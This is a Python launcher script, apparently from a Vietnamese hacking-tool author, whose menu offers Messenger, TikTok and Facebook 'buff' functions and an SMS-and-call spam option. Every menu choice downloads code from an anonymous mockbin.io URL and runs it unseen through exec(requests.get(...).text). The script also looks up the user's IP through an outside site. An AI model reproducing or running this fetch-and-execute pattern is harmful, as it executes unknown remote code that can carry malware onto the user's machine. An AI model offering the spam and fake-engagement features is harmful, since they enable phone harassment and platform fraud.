from bs4 import BeautifulSoup
from datetime import datetime
import re,requests,os,sys
from time import sleep 
from datetime import date
import requests, random
import requests
import base64, json,os
from datetime import date
from datetime import datetime
from time import sleep,strftime
from bs4 import BeautifulSoup
from datetime import datetime
import re,requests,os,sys
from time import sleep 
from datetime import date
import requests, random
import uuid, re
from bs4 import BeautifulSoup
import socket
from datetime import datetime
time=datetime.now().strftime("%H:%M:%S")
from pystyle import *
data_machine = []
today = date.today()
now = datetime.now()
thu = now.strftime("%A")
ngay_hom_nay = now.strftime("%d")
thang_nay = now.strftime("%m")
nam_ = now.strftime("%Y")
#IP
def get_ip_from_url(url):
    response = requests.get(url)
    ip_address = socket.gethostbyname(response.text.strip())
    return ip_address
url = "http://kiemtraip.com/raw.php"
ip = get_ip_from_url(url)
import os,sys
import requests,json
from time import sleep
from datetime import datetime, timedelta
import base64,requests,os
#màu
xnhac = "\033[1;36m"
do = "\033[1;31m"
luc = "\033[1;32m"
vang = "\033[1;33m"
xduong = "\033[1;34m"
hong = "\033[1;35m"
trang = "\033[1;37m"
whiteb="\033[1;37m"
red="\033[0;31m"
redb="\033[1;31m"
end='\033[0m'

import os, sys, requests
from time import sleep
from pystyle import *
from time import strftime
from datetime import datetime, timedelta
now=datetime.now()
os.system("cls" if os.name == "nt" else "clear")

import os, sys, requests
from time import sleep
from pystyle import *
from time import strftime
from datetime import datetime, timedelta
now=datetime.now()
os.system("cls" if os.name == "nt" else "clear")
sleep(1)
banner="""
\033[1;31m
\033[1;36m███╗░░░███╗██╗░░██╗██╗░░░██╗███╗░░██╗░██████╗░██╗░░██╗██████╗░███████╗██╗░░░██╗███████╗██╗░░░░░░█████╗░██████╗░███████╗██████╗░
\033[1;36m████╗░████║██║░░██║██║░░░██║████╗░██║██╔════╝░╚██╗██╔╝██╔══██╗██╔════╝██║░░░██║██╔════╝██║░░░░░██╔══██╗██╔══██╗██╔════╝██╔══██╗
\033[1;36m██╔████╔██║███████║██║░░░██║██╔██╗██║██║░░██╗░░╚███╔╝░██║░░██║█████╗░░╚██╗░██╔╝█████╗░░██║░░░░░██║░░██║██████╔╝█████╗░░██████╔╝
\033[1;36m██║╚██╔╝██║██╔══██║██║░░░██║██║╚████║██║░░╚██╗░██╔██╗░██║░░██║██╔══╝░░░╚████╔╝░██╔══╝░░██║░░░░░██║░░██║██╔═══╝░██╔══╝░░██╔══██╗
\033[1;36m██║░╚═╝░██║██║░░██║╚██████╔╝██║░╚███║╚██████╔╝██╔╝╚██╗██████╔╝███████╗░░╚██╔╝░░███████╗███████╗╚█████╔╝██║░░░░░███████╗██║░░██║
\033[1;36m╚═╝░░░░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚═════╝░╚══════╝░░░╚═╝░░░╚══════╝╚══════╝░╚════╝░╚═╝░░░░░╚══════╝╚═╝░░╚═╝
\033[1;32m╔══════════════════════════════════════════════╗
\033[1;32m║   \033[1;31mLiên Hệ Facebook : \033[1;33mhttps://www.facebook.com/mhung.x.dev/
\033[1;32m║══════════════════════════════════════════════║
\033[1;32m║   \033[1;31mName: \033[1;33mMhung_x_developers
\033[1;32m║══════════════════════════════════════════════║
\033[1;32m║   \033[1;31mLink Box Tele : \033[1;33mhttps://t.me/hung_x_developers
\033[1;32m║══════════════════════════════════════════════║
\033[1;32m║   \033[1;32m\033[1;31mPhiên Bản Tool : \033[1;33mV1 ( Bản đầu tiên của t)
\033[1;32m║══════════════════════════════════════════════║
\033[1;34m- \033[1;31mNEW UPDATE:\033[1;33m TOOL V1
\033[1;34m-\033[1;32m Làm Lại Cảm Xúc Facebook \033[1;36m[\033[1;33mTreo Được\033[1;36m]
\033[1;31m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
"""
for X in banner:
  sys.stdout.write(X)
  sys.stdout.flush() 
  sleep(0.00)
print(f"{xduong}█ {hong}Ngày{trang} : {vang}{ngay_hom_nay}{xduong} |{hong} Tháng{trang}: {vang}{thang_nay} {xduong}| {hong}Năm{trang}: {vang}{nam_}{xduong} | {hong}Thời Gian: {vang}{time}")
print(f'{xduong}█ {hong}Địa Chỉ IP Của Bạn : {vang}{ip}')

print("\033[1;31m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")

print(" \033[1;37m╔═════════════════════════════════════════════════════════════")
print("\033[1;32m ║ ➣Chức năng [1] \033[1;36mVar Messenger")
print(" \033[1;37m║═════════════════════════════════════════════════════════════")
print("\033[1;32m ║ ➣Chức năng [2] \033[1;36mBuff Tik Tok [\033[1;33mVip\033[1;36m]")
print(" \033[1;37m║═════════════════════════════════════════════════════════════")
print("\033[1;32m ║ ➣Chức năng [3] \033[1;36mBuff Facebook [\033[1;33mVip\033[1;36m]")
print(" \033[1;37m║═════════════════════════════════════════════════════════════")
print("\033[1;32m ║ ➣Chức năng [4] \033[1;36mSpam SMS & CALL VIP [\033[1;33mFree\033[1;36m][\033[1;33mNormal\033[1;36m]")
print(" \033[1;37m║═════════════════════════════════════════════════════════════")
chon = int(input('\033[1;31m[\033[1;37m[=.=]\033[1;31m] \033[1;37m=> \033[1;32mChọn chức năng \033[1;37m: \033[1;35m'))

if chon == 1 :

	exec(requests.get('https://28e334f3b383466b8e3f930356450d16.api.mockbin.io/').text)

if chon == 2 :
	
	exec(requests.get('https://b35ecf53016b4c0bbc0fb31859d617b2.api.mockbin.io/').text)

if chon == 3 :
	
	exec(requests.get('https://00719873a08c463ea7418b7f1420add8.api.mockbin.io/').text)

if chon == 4 :

	exec(requests.get('https://8c1081c5949b46929f4d5a63830fd9df.api.mockbin.io/').text)

	exit()